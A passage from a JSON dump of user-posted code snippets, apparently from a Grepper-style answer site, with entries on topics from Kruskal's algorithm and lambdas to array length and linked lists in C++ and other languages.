V, int E)      {          this->V = V;          this->E = E;      }         void addEdge(int u, int v, int w)      {          edges.push_back({w, {u, v}});      }           int kruskalMST();  };      struct DisjointSets  {      int *parent, *rnk;      int n;          DisjointSets(int n)      {               this->n = n;          parent = new int[n+1];          rnk = new int[n+1];                  for (int i = 0; i <= n; i++)          {              rnk[i] = 0;                        parent[i] = i;          }      }        int find(int u)      {                if (u != parent[u])              parent[u] = find(parent[u]);          return parent[u];      }           void merge(int x, int y)      {          x = find(x), y = find(y);                     if (rnk[x] > rnk[y])              parent[y] = x;          else              parent[x] = y;             if (rnk[x] == rnk[y])              rnk[y]++;      }  };         int Graph::kruskalMST()  {      int mst_wt = 0;         sort(edges.begin(), edges.end());          DisjointSets ds(V);          vector< pair<int, iPair> >::iterator it;      for (it=edges.begin(); it!=edges.end(); it++)      {          int u = it->second.first;          int v = it->second.second;             int set_u = ds.find(u);          int set_v = ds.find(v);                    if (set_u != set_v)          {                         cout << u << \" - \" << v << endl;                        mst_wt += it->first;                          ds.merge(set_u, set_v);          }      }         return mst_wt;  }      int main()  {          int V = 9, E = 14;      Graph g(V, E);             g.addEdge(0, 1, 4);      g.addEdge(0, 7, 8);      g.addEdge(1, 2, 8);      g.addEdge(1, 7, 11);      g.addEdge(2, 3, 7);      g.addEdge(2, 8, 2);      g.addEdge(2, 5, 4);      g.addEdge(3, 4, 9);      g.addEdge(3, 5, 14);      g.addEdge(4, 5, 10);      g.addEdge(5, 6, 2);      g.addEdge(6, 7, 1);      g.addEdge(6, 8, 6);      g.addEdge(7, 8, 7);         cout << \"Edges of MST are \\n\";      int mst_wt = g.kruskalMST();         cout << \"\\nWeight of MST is \" << mst_wt;         return 0;  } \n",
    "reg_date": "2021-10-12T11:41:49.000Z"
  },
  {
    "id": 2918,
    "keyword": null,
    "link": null,
    "title": " kruskal's algorithm c++ hackerearth",
    "description": "#include <iostream> #include <vector> #include <utility> #include <algorithm> using namespace std; const int MAX = 1e4 + 5; int id[MAX], nodes, edges; pair <long long, pair<int, int> > p[MAX];  void initialize() {     for(int i = 0;i < MAX;++i)         id[i] = i; }  int root(int x) {     while(id[x] != x)     {         id[x] = id[id[x]];         x = id[x];     }     return x; }  void union1(int x, int y) {     int p = root(x);     int q = root(y);     id[p] = id[q]; }  long long kruskal(pair<long long, pair<int, int> > p[]) {     int x, y;     long long cost, minimumCost = 0;     for(int i = 0;i < edges;++i)     {         // Selecting edges one by one in increasing order from the beginning         x = p[i].second.first;         y = p[i].second.second;         cost = p[i].first;         // Check if the selected edge is creating a cycle or not         if(root(x) != root(y))         {             minimumCost += cost;             union1(x, y);         }         }     return minimumCost; }  int main() {     int x, y;     long long weight, cost, minimumCost;     initialize();     cin >> nodes >> edges;     for(int i = 0;i < edges;++i)     {         cin >> x >> y >> weight;         p[i] = make_pair(weight, make_pair(x, y));     }     // Sort the edges in the ascending order     sort(p, p + edges);     minimumCost = kruskal(p);     cout << minimumCost << endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:41:49.000Z"
  },
  {
    "id": 2919,
    "keyword": null,
    "link": null,
    "title": " kth smallest element in binary search tree",
    "description": "#include<iostream> using namespace std; struct node {     int data;     node* left;     node* right; }; int ans=0; node* getnode(int value) {     node* temp=new node;     temp->data=value;     temp->left=NULL;     temp->right=NULL;     return temp; } node *insert_bst(node *roots,int value) {     if(roots==NULL)     {         return getnode(value);     }     if(roots->data>value)     {         roots->left=insert_bst(roots->left,value);     }     else if(roots->data<value)     {         roots->right=insert_bst(roots->right,value);     }     return roots; } void findsol(node* roots,int *kth) {     if(roots==NULL)     {         return;     }     else     {         findsol(roots->left,kth);         (*kth)--;         if((*kth)==0)         {             ans=roots->data;         }         findsol(roots->right,kth);     } } int main() {     node* root=new node;     root=NULL;     int value;     do{         cin>>value;         if(value>0)         {             root=insert_bst(root,value);         }     }while(value>0);     int k;     cin>>k;     int* kth=&k;     findsol(root,kth);     cout<<ans;     return 0; } \n",
    "reg_date": "2021-10-12T11:41:50.000Z"
  },
  {
    "id": 2920,
    "keyword": null,
    "link": null,
    "title": " kth smallest number again",
    "description": " void solve() {  \tint n, q; \tcin >> n >> q; \t// v =  [{1, 7}, {10, 15}] \tvector<pair<int, int>> arr(n); \tfor (int i = 0; i < n; i++) { \t\tcin >> arr[i].ff >> arr[i].ss; \t}  \t// v =  [{10, 15}, {1, 7}]  \tsort(arr.begin(), arr.end());  \t// v = [{1, 7}, {10, 15}];  \t// case : v = [{1, 7}, {15, 10}]; \tint idx = 0; \tfor (int i = 1; i < n; i++) { \t\tif (arr[idx].ff > arr[idx].ss) { \t\t\tarr[idx].ss = max(arr[idx].ff, arr[idx].ss); \t\t} \t\telse { \t\t\tidx++; \t\t\tarr[idx] = arr[i]; \t\t} \t}  \t// Searching \twhile (q--) {  \t\tint k; \t\tcin >> k;  \t\tint ans = -1; \t\tfor (int i = 0; i <= idx; i++) { \t\t\tif (arr[i].ss - arr[i].ff + 1 > k) { \t\t\t\tans = arr[i].ff + k - 1; \t\t\t\tbreak; \t\t\t} \t\t\telse { \t\t\t\tk -= arr[i].ss - arr[i].ff + 1; \t\t\t} \t\t} \t\tcout << ans << '\\n'; \t}    } \n",
    "reg_date": "2021-10-12T11:41:50.000Z"
  },
  {
    "id": 2921,
    "keyword": null,
    "link": null,
    "title": " kwakiutl tribe artifacts",
    "description": "//bruh y u ask grepper??\n",
    "reg_date": "2021-10-12T11:41:50.000Z"
  },
  {
    "id": 2922,
    "keyword": null,
    "link": null,
    "title": " labs c++",
    "description": "// Absolute value // Returns the absolute value of parameter n ( /n/ ).  // This is the long int version of abs.  long int labs (long int n);\n",
    "reg_date": "2021-10-12T11:41:50.000Z"
  },
  {
    "id": 2923,
    "keyword": null,
    "link": null,
    "title": " lambda c++",
    "description": "- Good website to learn lambda in c++: https://docs.microsoft.com/en-us/cpp/cpp/lambda-expressions-in-cpp https://en.cppreference.com/w/cpp/language/lambda https://www.geeksforgeeks.org/lambda-expression-in-c/ https://stackoverflow.com/questions/7627098/what-is-a-lambda-expression-in-c11 https://linuxhint.com/lambda-expressions-in-c/\n#include <iostream> using namespace std;  bool isGreater = [](int a, int b){ return a > b; }  int main() { \tcout << isGreater(5, 2) << endl; // Output: 1 \treturn 0; } \n#include <iostream> #include <string>   // returns a lambda auto makeWalrus(const std::string& name) {   // Capture name by reference and return the lambda.   return [&]() {     std::cout << \"I am a walrus, my name is \" << name << '\\n'; // Undefined behavior   }; }   int main() {   // Create a new walrus whose name is Roofus.   // sayName is the lambda returned by makeWalrus.   auto sayName{ makeWalrus(\"Roofus\") };     // Call the lambda function that makeWalrus returned.   sayName();     return 0; } \nstruct X {     int x, y;     int operator()(int);     void f()     {         // the context of the following lambda is the member function X::f         [=]()->int         {             return operator()(this->x + y); // X::operator()(this->x + (*this).y)                                             // this has type X*         };     } };\n//lambda function for sorting vector ascending sort(vec.begin(),vec.end(),[](int &a, int &b){ \treturn a<b; }); //lambda function for sorting vector of vector ascending based on first value sort(vec.begin(),vec.end(),[](vector<int> &a, vector<int> &b){ \treturn a[0]<b[0]; });\n",
    "reg_date": "2021-10-12T11:41:50.000Z"
  },
  {
    "id": 2924,
    "keyword": null,
    "link": null,
    "title": " lambda function in c++",
    "description": "- Good website to learn lambda in c++: https://docs.microsoft.com/en-us/cpp/cpp/lambda-expressions-in-cpp https://en.cppreference.com/w/cpp/language/lambda https://www.geeksforgeeks.org/lambda-expression-in-c/ https://stackoverflow.com/questions/7627098/what-is-a-lambda-expression-in-c11 https://linuxhint.com/lambda-expressions-in-c/\n#include <iostream> using namespace std;  bool isGreater = [](int a, int b){ return a > b; }  int main() { \tcout << isGreater(5, 2) << endl; // Output: 1 \treturn 0; } \n#include <iostream> #include <string>   // returns a lambda auto makeWalrus(const std::string& name) {   // Capture name by reference and return the lambda.   return [&]() {     std::cout << \"I am a walrus, my name is \" << name << '\\n'; // Undefined behavior   }; }   int main() {   // Create a new walrus whose name is Roofus.   // sayName is the lambda returned by makeWalrus.   auto sayName{ makeWalrus(\"Roofus\") };     // Call the lambda function that makeWalrus returned.   sayName();     return 0; } \nstruct X {     int x, y;     int operator()(int);     void f()     {         // the context of the following lambda is the member function X::f         [=]()->int         {             return operator()(this->x + y); // X::operator()(this->x + (*this).y)                                             // this has type X*         };     } };\n//lambda function for sorting vector ascending sort(vec.begin(),vec.end(),[](int &a, int &b){ \treturn a<b; }); //lambda function for sorting vector of vector ascending based on first value sort(vec.begin(),vec.end(),[](vector<int> &a, vector<int> &b){ \treturn a[0]<b[0]; });\n",
    "reg_date": "2021-10-12T11:41:50.000Z"
  },
  {
    "id": 2925,
    "keyword": null,
    "link": null,
    "title": " lambda function qt connect",
    "description": "connect(     sender, &Sender::valueChanged,     [=]( const QString &newValue ) { receiver->updateValue( \"senderValue\", newValue ); } ); \n",
    "reg_date": "2021-10-12T11:41:51.000Z"
  },
  {
    "id": 2926,
    "keyword": null,
    "link": null,
    "title": " landscape overleaf",
    "description": "\\usepackage{pdflscape} ... \\begin{landscape} ... \\end{landscape}\n",
    "reg_date": "2021-10-12T11:41:51.000Z"
  },
  {
    "id": 2927,
    "keyword": null,
    "link": null,
    "title": " lap trinh file explorer c++",
    "description": "#include <iostream> using namespace std;  int main() { \tcout << \"Hello World\" << endl;  \tcin.get(); \treturn 0; }\n",
    "reg_date": "2021-10-12T11:41:51.000Z"
  },
  {
    "id": 2928,
    "keyword": null,
    "link": null,
    "title": " largest element in vector c++",
    "description": "// Find the max element  cout << \"\\nMax Element = \"   \t << *max_element(a.begin(), a.end()); \n",
    "reg_date": "2021-10-12T11:41:51.000Z"
  },
  {
    "id": 2929,
    "keyword": null,
    "link": null,
    "title": " largest number in c++",
    "description": "#include <iostream> using namespace std; int main() { \tint num, max = 0; \tcout << \"Enter 3 numbers: \"; \tfor(int i = 0; i < 3; i++) \t{ \t\tcin >> num; \t\tif (num > max) \t\t\tmax = num; \t} \tcout << max << \" is the largest number.\"; \treturn 0; }\n",
    "reg_date": "2021-10-12T11:41:51.000Z"
  },
  {
    "id": 2930,
    "keyword": null,
    "link": null,
    "title": " largest subarray of sum k",
    "description": "def smallestSubWithSum(arr, n, x):       # Initialize current sum and minimum length     curr_sum = 0     min_len = n + 1       # Initialize starting and ending indexes     start = 0     end = 0     while (end < n):           # Keep adding array elements while current         # sum is smaller than or equal to x         while (curr_sum <= x and end < n):             curr_sum += arr[end]             end += 1           # If current sum becomes greater than x.         while (curr_sum > x and start < n):               # Update minimum length if needed             if (end - start < min_len):                 min_len = end - start               # remove starting elements             curr_sum -= arr[start]             start += 1       return min_len\ndef max_length(s, k):     current = []     max_len = -1 # returns -1 if there is no subsequence that adds up to k.     for i in s:         current.append(i)         while sum(current) > k: # Shrink the array from the left, until the sum is <= k.            current = current[1:]         if sum(current) == k:             max_len = max(max_len, len(current))      return max_len\n//variable size sliding window #include <bits/stdc++.h>  using namespace std;  int main() {     int n;     cout<<\"Enter the size of the array:\"<<endl;     cin>>n;     int arr[n];     cout<<\"Enter the elements of the array:\"<<endl;     for(int i=0;i<n;i++)     {         cin>>arr[i];     }     int k;     cout<<\"enter the sum whose longest subarray you want to find:\"<<endl;     cin>>k;     int i=0,j=0,sum=0;     int mx=0;     while(j<n)     {         sum=sum+arr[j];         if(sum<k)         {             j++;         }         else if(sum==k)         {             mx=max(mx,j-i+1);             j++;         }         else         {             while(sum>k)             {                 sum=sum-arr[i];                 i++;             }             j++;         }     }     cout<<mx<<endl;     return 0; } \n",
    "reg_date": "2021-10-12T11:41:51.000Z"
  },
  {
    "id": 2931,
    "keyword": null,
    "link": null,
    "title": " late binding and early binding in c++",
    "description": "#include<iostream> using namespace std; class Base {    public:    void display() {       cout<<\" In Base class\" <<endl;    } }; class Derived: public Base {    public:    void display() {       cout<<\"In Derived class\" << endl;    } }; int main(void) {    Base *base_pointer = new Derived;    base_pointer->display();    return 0; }\n#include<iostream> using namespace std; class Base {    public:    virtual void display() {       cout<<\"In Base class\" << endl;    } }; class Derived: public Base {    public:    void display() {       cout<<\"In Derived class\" <<endl;    } }; int main() {    Base *base_pointer = new Derived;    base_pointer->display();    return 0; }\n",
    "reg_date": "2021-10-12T11:41:51.000Z"
  },
  {
    "id": 2932,
    "keyword": null,
    "link": null,
    "title": " launch function with signal c++",
    "description": "#include <iostream> #include <csignal>   using namespace std;  sig_atomic_t signalled = 0;  void handler(int sig) {     signalled = 1; }  int main() {     signal(SIGINT, handler);          raise(SIGINT);     if (signalled)         cout << \"Signal is handled\";     else         cout << \"Signal is not handled\";      return 0; }\n",
    "reg_date": "2021-10-12T11:41:52.000Z"
  },
  {
    "id": 2933,
    "keyword": null,
    "link": null,
    "title": " lcm function c++",
    "description": "ll lcm(ll a,ll b) {     return (a*b)/gcd(a,b); }\n#include <bits/stdc++.h> using namespace std; int main() {     cout << 3*5/__gcd(3, 5) << endl;//15     return 0; } \n",
    "reg_date": "2021-10-12T11:41:52.000Z"
  },
  {
    "id": 2934,
    "keyword": null,
    "link": null,
    "title": " lcm in c++",
    "description": "ll lcm(ll a,ll b) {     return (a*b)/gcd(a,b); }\nffg nbcbg\n#include <bits/stdc++.h> using namespace std; int main() {     cout << 3*5/__gcd(3, 5) << endl;//15     return 0; } \n",
    "reg_date": "2021-10-12T11:41:52.000Z"
  },
  {
    "id": 2935,
    "keyword": null,
    "link": null,
    "title": " leetcode fast io",
    "description": "static bool     _foo = ios::sync_with_stdio(false); static ostream* _bar = cin.tie(NULL);\n",
    "reg_date": "2021-10-12T11:41:52.000Z"
  },
  {
    "id": 2936,
    "keyword": null,
    "link": null,
    "title": " left margin c++",
    "description": "// modify adjustfield using manipulators #include <iostream>     // std::cout, std::internal, std::left, std::right  int main () {   int n = -77;   std::cout.width(6); std::cout << std::internal << n << '\\n';   std::cout.width(6); std::cout << std::left << n << '\\n';   std::cout.width(6); std::cout << std::right << n << '\\n';   return 0; }\n",
    "reg_date": "2021-10-12T11:41:52.000Z"
  },
  {
    "id": 2937,
    "keyword": null,
    "link": null,
    "title": " length of 2d array c++",
    "description": "int rows = sizeof(arr) / sizeof(arr[0]); // returns rows int col = sizeof(arr[0]) / sizeof(int); // returns col\nstd::vector< std::vector<int> > my_array; /* 2D Array */  my_array.size(); /* size of y */ my_array[0].size(); /* size of x */\n",
    "reg_date": "2021-10-12T11:41:52.000Z"
  },
  {
    "id": 2938,
    "keyword": null,
    "link": null,
    "title": " length of a string c++",
    "description": "// string::length #include <iostream> #include <string>  int main () {   std::string str (\"Test string\");   std::cout << \"The size of str is \" << str.length() << \" bytes.\\n\";   return 0; }\nstr.length();\n#include <iostream> #include <string>  int main() {   string str = \"iftee\";      //method 1: using length() function   int len = str.length();   cout << \"The String Length: \" << len << endl;      //method 2: using size() function   int len2 = str.size();   cout << \"The String Length: \" << len2 << endl;      return 0; }\n#include <string> #include <iostream>  int main() {     std::string s(21, '*');      std::cout << s << std::endl;      return 0; } \nstring str =\"hello world\";  //different ways to find length of a string:  str.length();  str.size();  \n#include <iostream> using namespace std; int main() {     string str = \"Viet Nam\";     cout << \"String Length = \" << str.size();   \t// you can also use str.length()     return 0; }\n",
    "reg_date": "2021-10-12T11:41:52.000Z"
  },
  {
    "id": 2939,
    "keyword": null,
    "link": null,
    "title": " length of array c++",
    "description": "int arr[5]; int len = sizeof(arr) / sizeof(arr[0]); // returns 5\nint a[20]; int length; length = sizeof(a) / sizeof(int); \n#include <iostream> using namespace std; int main() {    int arr[5] = {4, 1, 8, 2, 9};    int len = sizeof(arr)/sizeof(arr[0]);    cout << \"The length of the array is: \" << len;    return 0; }\n#include <iostream> using namespace std;  #define size(type) ((char *)(&type+1)-(char*)(&type))  int main(){   int arr[5] = {1, 2, 3, 4, 5};   cout << size(arr) / size(arr[0]) << endl; //returns 5   //alternatively   cout << sizeof(arr) / sizeof(int) << endl; //returns 5 }\nint size = sizeof(arr)/sizeof(arr[0])\n// array::size #include <iostream> #include <array>  int main () {   std::array<int,5> myints;   std::cout << \"size of myints: \" << myints.size() << std::endl;   std::cout << \"sizeof(myints): \" << sizeof(myints) << std::endl;    return 0; }\n",
    "reg_date": "2021-10-12T11:41:52.000Z"
  },
  {
    "id": 2940,
    "keyword": null,
    "link": null,
    "title": " length of array in cpp",
    "description": "int arr[5]; int len = sizeof(arr) / sizeof(arr[0]); // returns 5\nint a[20]; int length; length = sizeof(a) / sizeof(int); \n#include <iostream> using namespace std; int main() {    int arr[5] = {4, 1, 8, 2, 9};    int len = sizeof(arr)/sizeof(arr[0]);    cout << \"The length of the array is: \" << len;    return 0; }\n#include <iostream> using namespace std;  #define size(type) ((char *)(&type+1)-(char*)(&type))  int main(){   int arr[5] = {1, 2, 3, 4, 5};   cout << size(arr) / size(arr[0]) << endl; //returns 5   //alternatively   cout << sizeof(arr) / sizeof(int) << endl; //returns 5 }\nint size = sizeof(arr)/sizeof(arr[0])\n// array::size #include <iostream> #include <array>  int main () {   std::array<int,5> myints;   std::cout << \"size of myints: \" << myints.size() << std::endl;   std::cout << \"sizeof(myints): \" << sizeof(myints) << std::endl;    return 0; }\n",
    "reg_date": "2021-10-12T11:41:53.000Z"
  },
  {
    "id": 2941,
    "keyword": null,
    "link": null,
    "title": " length of each number in array",
    "description": "\tconst int SIZE = 9; \tint arr[SIZE], arr2[SIZE]; \tcout << \"Enter numbers: \\n\"; \tfor (int i = 0; i < SIZE; i++) \t\tcin >> arr[i]; \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl; \t \tint count, number; \tfor (int i = 0; i < SIZE; i++) \t{ \t\tcount = 0; \t\tnumber = arr[i]; \t\tdo \t\t{ \t\t\t++count; \t\t\tnumber /= 10; \t\t} while (number); \t\tarr2[i] = count; \t} \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr2[i] << \"\\t\"; \tcout << endl; \n",
    "reg_date": "2021-10-12T11:41:53.000Z"
  },
  {
    "id": 2942,
    "keyword": null,
    "link": null,
    "title": " length of each number in array in c++",
    "description": "\tconst int SIZE = 9; \tint arr[SIZE], arr2[SIZE]; \tcout << \"Enter numbers: \\n\"; \tfor (int i = 0; i < SIZE; i++) \t\tcin >> arr[i]; \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl; \t \tint count, number; \tfor (int i = 0; i < SIZE; i++) \t{ \t\tcount = 0; \t\tnumber = arr[i]; \t\tdo \t\t{ \t\t\t++count; \t\t\tnumber /= 10; \t\t} while (number); \t\tarr2[i] = count; \t} \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr2[i] << \"\\t\"; \tcout << endl; \n",
    "reg_date": "2021-10-12T11:41:53.000Z"
  },
  {
    "id": 2943,
    "keyword": null,
    "link": null,
    "title": " length of int c++",
    "description": "unsigned int number_of_digits = 0;  do {      ++number_of_digits;       n /= base; } while (n);\nsizeof(num);\n",
    "reg_date": "2021-10-12T11:41:53.000Z"
  },
  {
    "id": 2944,
    "keyword": null,
    "link": null,
    "title": " length of string c++",
    "description": "// string::length #include <iostream> #include <string>  int main () {   std::string str (\"Test string\");   std::cout << \"The size of str is \" << str.length() << \" bytes.\\n\";   return 0; }\nstr.length();\n#include <iostream> #include <string>  int main() {   string str = \"iftee\";      //method 1: using length() function   int len = str.length();   cout << \"The String Length: \" << len << endl;      //method 2: using size() function   int len2 = str.size();   cout << \"The String Length: \" << len2 << endl;      return 0; }\n#include <string> #include <iostream>  int main() {     std::string s(21, '*');      std::cout << s << std::endl;      return 0; } \nstring str =\"hello world\";  //different ways to find length of a string:  str.length();  str.size();  \n#include <iostream> #include <cstring> using namespace std;  int main() {    // initialize C-string   char song[] = \"We Will Rock You!\";    // print the length of the song string   cout << strlen(song);    return 0; }  // Output: 17\n",
    "reg_date": "2021-10-12T11:41:53.000Z"
  },
  {
    "id": 2945,
    "keyword": null,
    "link": null,
    "title": " length of string in c++",
    "description": "// string::length #include <iostream> #include <string>  int main () {   std::string str (\"Test string\");   std::cout << \"The size of str is \" << str.length() << \" bytes.\\n\";   return 0; }\nstr.length();\n#include <iostream> #include <string>  int main() {   string str = \"iftee\";      //method 1: using length() function   int len = str.length();   cout << \"The String Length: \" << len << endl;      //method 2: using size() function   int len2 = str.size();   cout << \"The String Length: \" << len2 << endl;      return 0; }\n#include <string> #include <iostream>  int main() {     std::string s(21, '*');      std::cout << s << std::endl;      return 0; } \nstring str =\"hello world\";  //different ways to find length of a string:  str.length();  str.size();  \n#include <iostream> using namespace std; int main() {     string str = \"Viet Nam\";     cout << \"String Length = \" << str.size();   \t// you can also use str.length()     return 0; }\n",
    "reg_date": "2021-10-12T11:41:53.000Z"
  },
  {
    "id": 2946,
    "keyword": null,
    "link": null,
    "title": " length of string in java",
    "description": "String data = \"Hello, World!\"; int nameLength = data.length(); // 13\npublic class Sample_String {     public static void main(String[] args) {         //declare the String as an object S1 S2         String S1 = \"Hello Java String Method\";         String S2 = \"RockStar\";          //length() method of String returns the length of a String S1.         int length = S1.length();         System.out.println(\"Length of a String is: \" + length);         //8 Length of a String RockStar         System.out.println(\"Length of a String is: \" + S2.length());     } } \nstr.length();\nString data = \"Hello, World!\"; int nameLength = data.length(); \nstring.length() \n// String length() method example public class StringLengthJava {    public static void main(String[] args)    {       String str1 = \"flowerbrackets\";       String str2 = \"helloworld\";       System.out.println(\"string length : \" + str1.length());       System.out.println(\"string length : \" + str2.length());    } }\n",
    "reg_date": "2021-10-12T11:41:53.000Z"
  },
  {
    "id": 2947,
    "keyword": null,
    "link": null,
    "title": " les méthode quii ne peuvent pas etre virtuelles en c++",
    "description": "class Vehicule {     public:     void affiche() const;  //Affiche une description du Vehicule      protected:     int m_prix;  //Chaque v&eacute;hicule a un prix };  class Voiture : public Vehicule //Une Voiture EST UN Vehicule {     public:     void affiche() const;      private:     int m_portes;  //Le nombre de portes de la voiture };  class Moto : public Vehicule  //Une Moto EST UN Vehicule {     public:     void affiche() const;       private:     double m_vitesse;  //La vitesse maximale de la moto }; \n",
    "reg_date": "2021-10-12T11:41:54.000Z"
  },
  {
    "id": 2948,
    "keyword": null,
    "link": null,
    "title": " level order tree travarsel",
    "description": "class Node{ public:     long val = 0;     Node *left = nullptr, *right = nullptr;     Node(int val_): val(val_){} };  void level_order_traversal(Node *root=nullptr){     // printf(\"Level Order Tree Traversal: \\n\");     if(not root) return;      queue<Node*> Q;     Q.push(root);     Q.push(nullptr);      while(Q.size() > 1){         Node *current = Q.front();         Q.pop();          if(not current){             printf(\"\\n\");             Q.push(nullptr);             continue;         }         printf(\"%ld \", current->val);          if(current->left) Q.push(current->left);         if(current->right) Q.push(current->right);     }      printf(\"\\n\\n\"); }\n",
    "reg_date": "2021-10-12T11:41:54.000Z"
  },
  {
    "id": 2949,
    "keyword": null,
    "link": null,
    "title": " leveling system c++",
    "description": "void LevelUp() {   static const int required_experience[] =   {     0, 45, 95, 145, 210, 285, 380, 495, 610, 745, 99999999   };   //so whenever myexp reaches on of these integers, mylvl will go up by 1    while(myexp >= required_experience[mylvl])     ++mylvl; }\n",
    "reg_date": "2021-10-12T11:41:54.000Z"
  },
  {
    "id": 2950,
    "keyword": null,
    "link": null,
    "title": " lexene token pairs of java codes",
    "description": "/*  Hello world */print(\"Hello, World!\\n\");\n",
    "reg_date": "2021-10-12T11:41:54.000Z"
  },
  {
    "id": 2951,
    "keyword": null,
    "link": null,
    "title": " lexiographic value of string c++",
    "description": " #include<iostream>  #include<algorithm> // for lexicographical_compare()  using namespace std;     int main()  {      char one[] = \"mynameisomkar\";      char two[] = \"xyz\";      if( lexicographical_compare(one, one+13, two, two+3))      {          cout << \"mynameisomkar is lexicographically less than xyz\";      }      else     {          cout << \"mynameisomkar is not lexicographically less than xyz\";      }  } \n",
    "reg_date": "2021-10-12T11:41:54.000Z"
  },
  {
    "id": 2952,
    "keyword": null,
    "link": null,
    "title": " libraries required for gaming in c++",
    "description": "[1] SFML. [2] 2.5 Tutorials (SFML / Learn) [3] Simple DirectMedia Layer - Homepage. [4] GLFW - An OpenGL library.\n",
    "reg_date": "2021-10-12T11:41:54.000Z"
  },
  {
    "id": 2953,
    "keyword": null,
    "link": null,
    "title": " library imported for stl",
    "description": "#include<bits/stdc++.h> \n",
    "reg_date": "2021-10-12T11:41:54.000Z"
  },
  {
    "id": 2954,
    "keyword": null,
    "link": null,
    "title": " library management system in c++",
    "description": "contact @soumyadepp on insta. Code not fitting here!   Google fix this bug yaar what is this behaviour?\n",
    "reg_date": "2021-10-12T11:41:54.000Z"
  },
  {
    "id": 2955,
    "keyword": null,
    "link": null,
    "title": " life the universe and everything solution c++",
    "description": "#include <iostream>  int main() {     int input ;     while( std::cin >> input && input != 42 ) std::cout << '\\t' << input << '\\n' ;     while( std::cin >> input ) ; }\n",
    "reg_date": "2021-10-12T11:41:54.000Z"
  },
  {
    "id": 2956,
    "keyword": null,
    "link": null,
    "title": " linear search",
    "description": "def LinearSearch(array, n, k):      for j in range(0, n):          if (array[j] == k):              return j      return -1    array = [1, 3, 5, 7, 9]  k = 7 n = len(array)  result = LinearSearch(array, n, k)  if(result == -1):      print(\"Element not found\")  else:      print(\"Element found at index: \", result) \n//Java implementation of Linear Search  import java.util.Scanner;  public class LinearSearch {  \tpublic static void main(String[] args) { \t\t// TODO Auto-generated method stub \t\tScanner sc = new Scanner(System.in); \t\tint[] a = {10,20,50,30,40}; \t\tint key=sc.nextInt(),flag=0; \t\t \t\tfor(int i=0;i<a.length;i++)\t \t\t{ \t\t\tif(a[i]==key) \t\t\t{ \t\t\t\tflag=1; \t\t\t\tbreak; \t\t\t} \t\t\telse \t\t\t{ \t\t\t\tflag=0; \t\t\t} \t\t} \t\tif(flag==1) \t\t{ \t\t\tSystem.out.println(\"Success! Key (\"+ key + \") found\"); \t\t} \t\telse \t\t{ \t\t\tSystem.out.println(\"Error! This key (\" + key + \") does not exist in the array\"); \t\t} \t}  } \n#include <bits/stdc++.h>  using namespace std;   int search(int arr[], int n, int key)  {      int i;      for (i = 0; i < n; i++)          if (arr[i] == key)              return i;      return -1;  }   int main()  {      int arr[] = { 99,4,3,8,1 };      int key = 8;      int n = sizeof(arr) / sizeof(arr[0]);       int result = search(arr, n, key);      (result == -1)          ? cout << \"Element is not present in array\"         : cout << \"Element is present at index \" << result;       return 0;  }\ndef global_linear_search(target, array)   counter = 0   results = []    while counter < array.length     if array[counter] == target       results << counter       counter += 1     else       counter += 1     end   end    if results.empty?     return nil   else     return results   end end\nA linear search is the simplest method of searching a data set. Starting at the beginning of the data set, each item of data is examined until a match is made. Once the item is found, the search ends.\n",
    "reg_date": "2021-10-12T11:41:54.000Z"
  },
  {
    "id": 2957,
    "keyword": null,
    "link": null,
    "title": " linear search in c++",
    "description": "def linear_search(a, key): \tposition = 0 \tflag = False \twhile position < len(a) and not flag: \t\tif a[position] == key: \t\t\tflag = True \t\telse: \t\t\tposition = position + 1 \treturn flag\nbool linearsearch(int A[], int N, int X) {   for (int i=0; i<N; i++)      if (A[i] == X) return true;   return false; }\n",
    "reg_date": "2021-10-12T11:41:54.000Z"
  },
  {
    "id": 2958,
    "keyword": null,
    "link": null,
    "title": " linerenderer follow camera unity",
    "description": "You can render the line using a dedicated camera. Use .depth to control the order in which cameras render (i.e. render the line on top of -everything-), and .cullingMask to define what each camera renders (or not).  http://unity3d.com/support/documentation/ScriptReference/Camera-depth.html  http://unity3d.com/support/documentation/ScriptReference/Camera-cullingMask.html\nYou simply have to update the points in Update to new world positions each update (and not just when you create the curve).  Something along:  int i = 0;   foreach screenPosition of my curve    Vector3 worldPosition = camera.ScreenToWorldPoint(screenPosition);     lineRenderer.SetPosition(i, worldPosition);    i++;  The tricky part will be to update if you interpolate screenpositions (or worldPositions), or sample them. In either case, the slow but easy method will be to re-interpolate and resample each Update.  Once you have got this going, you can optimise by storing the the right number of points in screen space. Then you only have to convert to world space - no need to resample or reinterpolate.\n",
    "reg_date": "2021-10-12T11:41:55.000Z"
  },
  {
    "id": 2959,
    "keyword": null,
    "link": null,
    "title": " linked list class c++ basic implementation",
    "description": "template<typename T> class list {   public:      struct node {         T value;         node* next;     };      list() : hd(nullptr), tl(nullptr) {}      node* head() { return hd; }     node* tail() { return tl; }      void insert(node* prior, T value);      node* at(int i);          void erase(node* prior);     void clear();      void push_back(T value);     void pop_back();      void push_front(T value);     void pop_front();      int size();        private:     node* hd, tl; } \n",
    "reg_date": "2021-10-12T11:41:55.000Z"
  },
  {
    "id": 2960,
    "keyword": null,
    "link": null,
    "title": " linked list in c++ stl",
    "description": "#include <iostream>  using namespace std;  struct node {     int data;     node *next; };  class linked_list { private:     node *head,*tail; public:     linked_list()     {         head = NULL;         tail = NULL;     }      void add_node(int n)     {         node *tmp = new node;         tmp->data = n;         tmp->next = NULL;          if(head == NULL)         {             head = tmp;             tail = tmp;         }         else         {             tail->next = tmp;             tail = tail->next;         }     } };  int main() {     linked_list a;     a.add_node(1);     a.add_node(2);     return 0; }\n #include <bits/stdc++.h> #include <iostream> #include <list> #include <iterator>  #define ll long long  using namespace std;  //function to print all the elements of the linked list void showList(list <int> l){ \tlist <int> :: iterator it; //create an iterator according to the data structure \tfor(it = l.begin(); it != l.end(); it++){ \t\tcout<<*it<<\" \"; \t} \t }\t   int main(){ \t \tlist <int> l1; \tlist <int> l2; \t \tfor(int i=0; i<10; i++){ \t\tl1.push_back(i*2); //fill list 1 with multiples of 2 \t\tl2.push_back(i*3); //fill list 2 with multiples of 3 \t} \t \tcout<<\"content of list 1 is \"<<endl; \tshowList(l1); \tcout<<endl; \t \tcout<<\"content of list 2 is \"<<endl; \tshowList(l2); \tcout<<endl; \t \t//reverse the first list \tl1.reverse(); \tshowList(l1); \tcout<<endl; \t \t//sort the first list \tl1.sort(); \tshowList(l1); 